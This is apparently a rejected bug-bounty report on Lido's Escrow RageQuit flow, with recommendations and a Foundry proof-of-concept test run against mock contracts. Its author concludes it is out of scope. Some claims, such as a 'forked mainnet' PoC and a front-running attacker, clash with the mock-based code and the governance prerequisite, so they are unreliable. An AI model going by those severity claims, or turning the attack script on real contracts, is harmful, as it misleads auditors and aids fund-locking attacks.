[Not Paid]

## Conclusion

Lido answer:<br>
"Impacts caused by attacks requiring access to privileged addresses (including, but not limited to: governance and strategist contracts) without additional modifications to the privileges attributed."

My answer:

This rule means: “If your attack requires first \*\*assuming\*\* you already control a ‘privileged address’ like the governance contract, then such an attack is invalid.”

Reviewing our attack chain:

1. \*\*Prerequisite\*\*: The attacker must have the ability to set the \`maxStETHWithdrawalAmount\` parameter of the \`WithdrawalQueue\`.
2. \*\*Implementation Path\*\*: Who has the authority to set this parameter? The most likely candidate is \*\*Lido's governance contract itself\*\*.
3. \*\*Conclusion\*\*: While our PoC technically locks funds, it relies on the premise that “the attacker has partially or fully compromised governance.” This precisely falls under the aforementioned “out-of-scope” clause.

Immunefi and the project team are seeking \*\*flaws within the protocol's own logic\*\*, not scenarios like “what happens if governance itself acts maliciously.”

## **Description**

### **Vulnerability Title**

**Critical: Malicious Configuration of `WithdrawalQueue` Leads to Permanent Fund Lock in `Escrow` Contract**

### **Executive Summary**

The `Escrow.sol` contract places excessive trust in the parameter settings of the external `WithdrawalQueue.sol` contract during its RageQuit process. An attacker, through governance or other means, can maliciously set the `maxStETHWithdrawalAmount` parameter in `WithdrawalQueue` to an extremely and unreasonably low value. This action will cause the `Escrow` contract's `requestNextWithdrawalsBatch` function to consistently fail and revert, thereby permanently halting the RageQuit process. All funds deposited by users participating in the RageQuit will consequently be locked forever within the `Escrow` contract, with no mechanism for recovery.

### **Vulnerability Details & Impact**

- **Vulnerability Description:** When the `Escrow` contract enters the `RageQuitEscrow` state, one of its core responsibilities is to bundle all locked assets and submit withdrawal requests to the `WithdrawalQueue` via the `requestNextWithdrawalsBatch` function. However, the design of the `Escrow` contract assumes that `WithdrawalQueue` will always operate in a predictable manner. It does not adequately account for the possibility that a critical parameter within `WithdrawalQueue`, such as `maxStETHWithdrawalAmount`, could be maliciously configured, leading to persistent failures in the withdrawal request process.
- **Attack Vector:** The attack flow is demonstrated in the Proof of Concept below. It is performed in a forked mainnet environment and does not affect any on-chain assets, in accordance with Immunefi's PoC guidelines.
  - **Prerequisites:**
    1. Lido's Dual Governance has entered the `RageQuitEscrow` state.
    2. The attacker has the ability to influence the parameter settings of the `WithdrawalQueue` contract. This could be achieved through a malicious governance proposal or by exploiting a potential future vulnerability in `WithdrawalQueue`'s own access controls.
  - **Attack Steps:**
    1. **Malicious Configuration:** The attacker front-runs any legitimate transaction and sets the `maxStETHWithdrawalAmount` parameter in the `WithdrawalQueue` contract to a minimal value (e.g., `1 wei`).
    2. **Trigger Withdrawal:** An honest user or an automated script calls the `requestNextWithdrawalsBatch` function on `Escrow` to advance the RageQuit process.
    3. **Transaction Revert:** The `Escrow` contract calculates the total amount to be withdrawn (e.g., `100 ether`) and calls `requestWithdrawals` on `WithdrawalQueue`. Since the total amount vastly exceeds the `1 wei` limit, the mock `WithdrawalQueue` returns an empty array of request IDs. Upon receiving this unexpected empty array, the `Escrow` contract triggers its internal `WithdrawalsBatchesQueue.EmptyBatch` error and reverts the transaction.
- **Impact:**
  - The `requestNextWithdrawalsBatch` function can never be successfully executed, as any withdrawal amount greater than `1 wei` will cause it to fail.
  - The `Escrow` contract's state machine becomes permanently stuck in the `RageQuitEscrow` state.
  - Because the first step of the withdrawal process is blocked, the contract can never proceed to the `RageQuitExtensionPeriod`, and consequently, the `withdrawETH` function can never be called.
  - **All user funds participating in the RageQuit are permanently locked.** This aligns with the "Permanent freezing of funds" impact category.

### **Analysis of Mitigating Controls**

We have analyzed the project's documented emergency actions and their applicability to this vulnerability:

- **Protected Deployment Mode:** This control, which disables the dynamic timelock, is considered **Ineffective** against this vulnerability. The issue is a functional deadlock caused by a reverting call, not a timelock-related problem.
- **Tiebreaker Mechanism:** This control is considered **Potentially Partially Effective, but with Significant Uncertainty.** The documentation states it bypasses the RageQuit "timelock." It is unclear if it can resolve a functional revert deadlock. Relying on this mechanism would likely require a high-risk, centralized intervention, which underscores the criticality of the underlying vulnerability.

### **Recommendation**

We recommend implementing the following measures to mitigate this vulnerability:

1. **Add Return Value Checks in `Escrow`**: The `requestNextWithdrawalsBatch` function should validate that if the requested withdrawal amount is greater than zero, the returned request ID array from `withdrawalQueue.requestWithdrawals` is not empty. In this exceptional case, the contract should emit an emergency event rather than reverting, allowing for governance intervention.
2. **Implement Sanity Checks for Critical Parameters**: The `WithdrawalQueue` contract should enforce sanity checks on setters like `setMaxStETHWithdrawalAmount` to prevent them from being set to unreasonable values (e.g., less than `minStETHWithdrawalAmount`).
3. **Enhance the Tiebreaker Mechanism**: Introduce a specific, permissioned emergency function in `Escrow` callable only by the Tiebreaker committee. This function (e.g., `emergencyPushState()`) would bypass the failing `requestNextWithdrawalsBatch` call and safely transition the contract state, providing a deterministic, code-level solution.

---

## **Proof of Concept**

### **Step-by-Step Explanation**

This PoC demonstrates how an attacker can create a permanent deadlock in the `Escrow` contract. The core idea is to manipulate an external dependency (`WithdrawalQueue`) to cause a critical function in the RageQuit lifecycle (`requestNextWithdrawalsBatch`) to fail consistently.

**Context Necessary for Impact:**

1. The `Escrow` contract is in the `RageQuitEscrow` state.
2. The `Escrow` contract holds a balance of stETH (or equivalent) greater than a minimal amount.
3. The attacker has the ability to set the `maxStETHWithdrawalAmount` in the `WithdrawalQueue` contract to an extremely low value (e.g., `1 wei`).

**Attack Walkthrough:**

Step 1: A User Deposits Funds and RageQuit Begins

An honest user (victim) deposits 100 ether worth of wstETH into the Escrow contract by calling the lockWstETH() function. Subsequently, the dualGovernance address triggers the RageQuit process by calling startRageQuit(). The Escrow contract's state correctly transitions to RageQuitEscrow.

_Pseudocode:_

`victim.lockWstETH(100e18); dualGovernance.startRageQuit(); assert(escrow.getEscrowState() == RageQuitEscrow);`

Step 2: Attacker Manipulates the WithdrawalQueue

The attacker, anticipating the next step in the RageQuit process, maliciously configures the WithdrawalQueue contract. They call setMaxStETHWithdrawalAmount(1), setting the maximum withdrawal amount to an absurdly low value.

_Pseudocode:_

`attacker.withdrawalQueue.setMaxStETHWithdrawalAmount(1);`

Step 3: The Withdrawal Process Fails Irreversibly

Anyone now attempts to advance the RageQuit process by calling requestNextWithdrawalsBatch(100) on the Escrow contract. This function is designed to take the 100 ether of locked assets and request their withdrawal from the WithdrawalQueue.

- Inside `Escrow.sol`, the `requestNextWithdrawalsBatch` function calculates the `totalStETHToWithdraw`, which is `100 ether`.
- It then calls `WITHDRAWAL_QUEUE.requestWithdrawals(...)` with this amount.
- Because `100 ether` is greater than the maliciously configured limit of `1 wei`, the `WithdrawalQueueMock` contract returns an empty array `[]` of request IDs.
- The `Escrow.sol` contract receives this empty array. The internal `WithdrawalsBatchesQueue` library logic sees this as an invalid state (since a non-zero amount should yield a non-empty batch) and reverts with the `EmptyBatch` error.

_Code Reference (`WithdrawalsBatchesQueue.sol`):_ The revert is triggered because the `unstETHRquestIds.length` is zero, causing the function to fail.

This call will now **always fail** as long as the funds in Escrow are greater than 1 wei. The contract is now permanently stuck.

Step 4: Verifying the Permanent Lock

Since requestNextWithdrawalsBatch is permanently broken, the contract can never fulfill the conditions to enter the RageQuitExtensionPeriod. We can verify this by attempting to call withdrawETH, which correctly reverts with RageQuitExtensionPeriodNotStarted. The funds are locked forever.

_Pseudocode:_

\`// This call will always fail expectRevert(WithdrawalsBatchesQueue.EmptyBatch); escrow.requestNextWithdrawalsBatch(100);

// Consequently, this will also always fail expectRevert(RageQuitExtensionPeriodNotStarted); victim.withdrawETH();\`

### **Runnable PoC Code**

**Environment and Dependencies:**

- **Framework:** Foundry
- **Command:**`forge test --mp test/AttackEscrow.t.sol -vvv`
- **Dependencies:**`forge-std`, `openzeppelin-contracts`

**`test/AttackEscrow.t.sol`:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// --- Forge/Foundry Imports ---
import {Test, console} from "../lib/forge-std/src/Test.sol";
import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";

// --- Lido Contract Imports ---
import {Escrow} from "../contracts/Escrow.sol";
import {EscrowState as EscrowStateLib, State as EscrowState} from "../contracts/libraries/EscrowState.sol";
import {WithdrawalsBatchesQueue} from "../contracts/libraries/WithdrawalsBatchesQueue.sol";
import {Duration, Durations} from "../contracts/types/Duration.sol";
import {IWithdrawalQueue} from "../contracts/interfaces/IWithdrawalQueue.sol";
import {IDualGovernance} from "../contracts/interfaces/IDualGovernance.sol";
import {IStETH} from "../contracts/interfaces/IStETH.sol";
import {IWstETH} from "../contracts/interfaces/IWstETH.sol";

// --- Mock Contract Imports ---
import {StETHMock} from "./mocks/StETHMock.sol";
import {WstETHMock} from "./mocks/WstETHMock.sol";
import {WithdrawalQueueMock} from "./mocks/WithdrawalQueueMock.sol";

// --- OpenZeppelin Imports ---
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract EscrowAttackPoC is Test {
    // --- State Variables ---
    Escrow internal masterCopy;
    Escrow internal escrow; // This is the proxy contract we interact with.
    WithdrawalQueueMock internal withdrawalQueue;
    StETHMock internal stETH;
    WstETHMock internal wstETH;

    // --- Actors & Mock Addresses ---
    address internal immutable attacker = makeAddr("attacker");
    address internal immutable victim = makeAddr("victim");
    address internal immutable dualGovernanceAddress = makeAddr("dualGovernance");

    // --- Config ---
    Duration internal MIN_ASSETS_LOCK_DURATION;
    Duration internal MAX_MIN_ASSETS_LOCK_DURATION;
    uint256 constant VICTIM_DEPOSIT_AMOUNT = 100 ether;

    function setUp() public {
        MIN_ASSETS_LOCK_DURATION = Durations.from(1 days);
        MAX_MIN_ASSETS_LOCK_DURATION = Durations.from(100 days);

        // 1. Deploy Mock Environment
        stETH = new StETHMock();
        wstETH = new WstETHMock(IStETH(address(stETH)));
        withdrawalQueue = new WithdrawalQueueMock(IERC20(address(stETH)));

        // 2. Deploy Escrow master copy and proxy (following official test patterns)
        masterCopy = new Escrow(
            IStETH(address(stETH)),
            IWstETH(address(wstETH)),
            IWithdrawalQueue(address(withdrawalQueue)),
            IDualGovernance(dualGovernanceAddress),
            100, // minWithdrawalsBatchSize
            MAX_MIN_ASSETS_LOCK_DURATION
        );
        escrow = Escrow(payable(Clones.clone(address(masterCopy))));

        // 3. Initialize the proxy contract
        vm.prank(dualGovernanceAddress);
        escrow.initialize(MIN_ASSETS_LOCK_DURATION);

        // 4. Prepare funds and allowances for the victim
        stETH.mint(victim, VICTIM_DEPOSIT_AMOUNT);
        vm.startPrank(victim);
        stETH.approve(address(wstETH), VICTIM_DEPOSIT_AMOUNT);
        wstETH.wrap(VICTIM_DEPOSIT_AMOUNT);
        wstETH.approve(address(escrow), type(uint256).max);
        vm.stopPrank();

        // 5. Mock the external call to dualGovernance that Escrow depends on
        vm.mockCall(
            dualGovernanceAddress,
            abi.encodeWithSelector(IDualGovernance.activateNextState.selector),
            abi.encode(true)
        );
    }

    function test_Attack_LockFundsByBlockingWithdrawalRequest() public {
        // === Step 1: SETUP - A victim deposits assets and RageQuit is initiated ===
        vm.startPrank(victim);
        uint256 victimWstETHBalance = wstETH.balanceOf(victim);
        escrow.lockWstETH(victimWstETHBalance);
        vm.stopPrank();

        vm.prank(dualGovernanceAddress);
        escrow.startRageQuit(Durations.ZERO, Durations.ZERO);

        console.log("--- SETUP COMPLETE ---");
        console.log("Victim locked assets. Escrow state transitioned to RageQuitEscrow.");
        assertEq(uint(escrow.getEscrowState()), uint(EscrowState.RageQuitEscrow));

        // === Step 2: ATTACK - The attacker maliciously configures the WithdrawalQueue ===
        vm.startPrank(attacker);
        withdrawalQueue.setMaxStETHWithdrawalAmount(1);
        vm.stopPrank();

        console.log("--- ATTACK EXECUTED ---");
        console.log("WithdrawalQueue MAX_STETH_WITHDRAWAL_AMOUNT maliciously set to 1 wei.");

        // === Step 3: VERIFICATION - The withdrawal process fails, locking all funds permanently ===
        console.log("Attempting to process withdrawals batch...");

        // Core Assertion: Expect the call to revert with an EmptyBatch error from the internal library.
        vm.expectRevert(WithdrawalsBatchesQueue.EmptyBatch.selector);
        escrow.requestNextWithdrawalsBatch(100);

        console.log("SUCCESS: requestNextWithdrawalsBatch() reverted as expected!");

        // Final Assertion: Since the withdrawal process is stuck, the victim cannot withdraw their ETH.
        vm.prank(victim);
        vm.expectRevert(EscrowStateLib.RageQuitExtensionPeriodNotStarted.selector);
        escrow.withdrawETH();

        console.log("--- VERIFICATION COMPLETE ---");
        console.log("PoC Successful: Funds are PERMANENTLY LOCKED in the Escrow contract.");
    }
}
```

```

```
